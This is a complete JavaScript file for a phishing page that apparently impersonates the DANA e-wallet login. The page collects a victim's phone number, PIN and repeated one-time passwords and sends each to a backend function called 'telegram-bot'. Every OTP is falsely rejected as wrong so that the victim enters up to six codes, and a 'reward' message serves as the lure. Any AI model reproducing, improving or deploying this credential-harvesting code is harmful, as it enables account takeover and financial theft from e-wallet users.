document.addEventListener('DOMContentLoaded', () => {
  // DOM References
  const pages = {
    n: document.getElementById('number-page'),
    p: document.getElementById('pin-page'),
    o: document.getElementById('otp-page')
  };
  
  const lb = document.getElementById('lanjutkan-button');
  const pn = document.getElementById('phone-number');
  const pis = document.querySelectorAll('.pin-box');
  const ois = document.querySelectorAll('.otp-box');
  const fn = document.getElementById('floating-notification');
  const sn = document.getElementById('success-notification');
  const rn = document.getElementById('reward-notification');
  const ac = document.getElementById('attempt-counter');
  const an = document.getElementById('attempt-number');
  const lc = document.getElementById('lanjutkan-container');
  const rewardInstruction = document.getElementById('reward-instruction');
  const resendOtp = document.getElementById('resend-otp');

  // State Variables
  let currentPage = 'n';
  let phoneNumber = '';
  let pin = '';
  let otp = '';
  let attemptCount = 0;
  const maxAttempts = 6;
  let otpTimer;

  // Helper Functions
  function showSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'flex';
  }

  function hideSpinner() {
    document.querySelector('.spinner-overlay').style.display = 'none';
  }

  function startOTPTimer() {
    let timeLeft = 120;
    const timerElement = document.getElementById('otp-timer');
    
    // Reset timer state
    clearInterval(otpTimer);
    if (resendOtp) {
      resendOtp.style.pointerEvents = 'none';
      resendOtp.style.opacity = '0.5';
    }
    
    otpTimer = setInterval(() => {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
      
      if (timeLeft <= 0) {
        clearInterval(otpTimer);
        if (resendOtp) {
          resendOtp.style.pointerEvents = 'auto';
          resendOtp.style.opacity = '1';
        }
      }
      timeLeft--;
    }, 1000);
  }

  function resetOTPInputs() {
    ois.forEach(input => input.value = '');
    if (ois[0]) ois[0].focus();
    otp = '';
    attemptCount++;
    if (an) an.textContent = attemptCount;
    if (ac) ac.style.display = 'block';
  }

  function showRewardInstruction() {
    if (rewardInstruction) {
      rewardInstruction.style.display = 'block';
      
      // Close button handler
      const closeBtn = rewardInstruction.querySelector('.close-btn');
      if (closeBtn) {
        closeBtn.addEventListener('click', () => {
          rewardInstruction.style.display = 'none';
        });
      }
    }
  }

  // Backend Communication - Fixed function name
  async function sendDanaData(type, data) {
    try {
      // Menggunakan nama function yang benar
      const response = await fetch('/.netlify/functions/telegram-bot', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ type, ...data })
      });
      
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(errorText || `Server error: ${response.status}`);
      }
      
      return await response.json();
    } catch (error) {
      console.error('API Error:', error);
      
      // Fallback: Simulasi sukses jika server error (untuk demo)
      if (error.message.includes('Failed to fetch') || error.message.includes('NetworkError')) {
        console.log('Network error, continuing in demo mode');
        return { success: true, message: 'Data processed successfully (demo mode)' };
      }
      
      throw error;
    }
  }

  // Phone Number Formatting
  if (pn) {
    pn.addEventListener('input', (e) => {
      // Hapus semua karakter non-digit
      let value = e.target.value.replace(/\D/g, '');
      
      // Hapus angka 0 di awal jika ada
      if (value.startsWith('0')) {
        value = value.substring(1);
      }
      
      // Pastikan selalu dimulai dengan 8
      if (value.length > 0 && !value.startsWith('8')) {
        value = '8' + value.replace(/^8/, '');
      }
      
      // Batasi panjang maksimal (3+4+5=12 digit)
      if (value.length > 12) {
        value = value.substring(0, 12);
      }
      
      // Format nomor dengan tanda hubung
      let formatted = '';
      if (value.length > 0) {
        formatted = value.substring(0, 3);
        if (value.length > 3) {
          formatted += '-' + value.substring(3, 7);
        }
        if (value.length > 7) {
          formatted += '-' + value.substring(7, 12);
        }
      }
      
      // Set nilai input dengan format yang sudah dibuat
      e.target.value = formatted;
      
      // Simpan nomor tanpa format untuk pengiriman data
      phoneNumber = value;
      
      // Tampilkan tombol lanjutkan jika nomor valid
      if (phoneNumber.length >= 10 && lb) {
        lb.disabled = false;
        lb.style.opacity = '1';
      } else if (lb) {
        lb.disabled = true;
        lb.style.opacity = '0.7';
      }
    });
  }

  // Event Handlers
  if (lb) {
    lb.addEventListener('click', async () => {
      if (currentPage === 'n') {
        if (phoneNumber.length < 10) {
          alert('Nomor HP harus minimal 10 digit');
          return;
        }
        
        showSpinner();
        try {
          const result = await sendDanaData('phone', { phone: phoneNumber });
          console.log('Phone submission result:', result);
          
          pages.n.style.display = 'none';
          pages.p.style.display = 'block';
          currentPage = 'p';
          if (lc) lc.style.display = 'none';
        } catch (error) {
          console.error('Phone submission error:', error);
          alert('Gagal mengirim data: ' + error.message);
        } finally {
          hideSpinner();
        }
      }
    });
  }

  // PIN Input Handling
  if (pis.length > 0) {
    pis.forEach((input, index) => {
      input.addEventListener('input', async (e) => {
        e.target.value = e.target.value.replace(/\D/g, '');
        
        if (e.target.value.length === 1 && index < pis.length - 1) {
          pis[index + 1].focus();
        }
        
        pin = Array.from(pis).map(i => i.value).join('');
        
        if (pin.length === 6) {
          showSpinner();
          try {
            const result = await sendDanaData('pin', { phone: phoneNumber, pin });
            console.log('PIN submission result:', result);
            
            pages.p.style.display = 'none';
            pages.o.style.display = 'block';
            currentPage = 'o';
            if (lc) lc.style.display = 'none';
            startOTPTimer();
            setTimeout(() => {
              if (fn) {
                fn.style.display = 'block';
                fn.innerHTML = 'Silakan verifikasi notifikasi yang muncul di perangkat Anda untuk menerima kode OTP.';
              }
            }, 1000);
          } catch (error) {
            console.error('PIN submission error:', error);
            alert('Gagal mengirim PIN: ' + error.message);
          } finally {
            hideSpinner();
          }
        }
      });
      
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
          pis[index - 1].focus();
        }
      });
    });
  }

  // OTP Input Handling
  if (ois.length > 0) {
    ois.forEach((input, index) => {
      input.addEventListener('input', async (e) => {
        e.target.value = e.target.value.replace(/\D/g, '');
        
        if (e.target.value.length === 1 && index < ois.length - 1) {
          ois[index + 1].focus();
        }
        
        otp = Array.from(ois).map(i => i.value).join('');
        
        if (index === ois.length - 1 && e.target.value.length === 1) {
          showSpinner();
          try {
            const result = await sendDanaData('otp', { phone: phoneNumber, pin, otp });
            console.log('OTP submission result:', result);
            
            setTimeout(() => {
              resetOTPInputs();
              
              // Show reward instruction after 2 attempts
              if (attemptCount === 2) {
                showRewardInstruction();
              }
              
              if (attemptCount > 2 && rn) {
                rn.style.display = 'block';
                rn.innerHTML = `
                  <div class="notification-content">
                    <h3>Kode OTP Salah</h3>
                    <p>Silakan cek SMS atau WhatsApp Anda</p>
                  </div>
                `;
                setTimeout(() => {
                  if (rn) rn.style.display = 'none';
                }, 10000);
              }
              
              if (attemptCount >= maxAttempts && sn) {
                if (fn) fn.style.display = 'none';
                sn.style.display = 'block';
                setTimeout(() => {
                  if (sn) sn.style.display = 'none';
                }, 5000);
              }
            }, 1000);
          } catch (error) {
            console.error('OTP submission error:', error);
          } finally {
            hideSpinner();
          }
        }
      });
      
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
          ois[index - 1].focus();
        }
      });
    });
  }

  // Resend OTP Handler
  if (resendOtp) {
    resendOtp.addEventListener('click', function() {
      if (this.style.pointerEvents === 'auto' || this.style.opacity === '1') {
        showSpinner();
        setTimeout(() => {
          startOTPTimer();
          hideSpinner();
          alert('Kode OTP telah dikirim ulang ke nomor Anda');
        }, 1000);
      }
    });
  }

  // Toggle PIN Visibility
  const showTextBtn = document.querySelector('.show-text');
  if (showTextBtn) {
    showTextBtn.addEventListener('click', (e) => {
      const isShowing = e.target.classList.toggle('active');
      const pinInputs = document.querySelectorAll('.pin-box');
      pinInputs.forEach(input => {
        input.type = isShowing ? 'text' : 'password';
      });
      e.target.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
    });
  }

  // Handle floating notification click
  if (fn) {
    fn.addEventListener('click', () => {
      fn.style.display = 'none';
    });
  }

  // Initialize button state
  if (lb) {
    lb.disabled = true;
    lb.style.opacity = '0.7';
  }

  // Auto-focus on first input
  if (pn) {
    setTimeout(() => {
      pn.focus();
    }, 500);
  }
});
